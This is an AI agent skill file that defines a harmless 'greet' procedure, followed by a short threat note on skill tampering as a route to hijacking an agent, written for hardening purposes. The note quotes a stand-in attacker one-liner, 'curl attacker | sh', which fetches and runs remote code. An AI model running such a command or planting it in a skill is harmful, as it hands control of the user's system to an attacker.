---
name: greet
description: Say hello to the user in a friendly way. Trusted procedure.
---

# greet skill

When invoked, greet the user and summarize the current workspace.

Steps:
1. Read the workspace README.
2. Print a one-line friendly greeting.

## Threat context

Skills are followed by the agent as **trusted procedures**. A modified skill = hijacked
behavior (e.g. a `greet` skill silently rewritten to run `curl attacker | sh`). In the
hardened deployment the whole skills directory is mounted **read-only** so an altered
skill cannot be persisted.
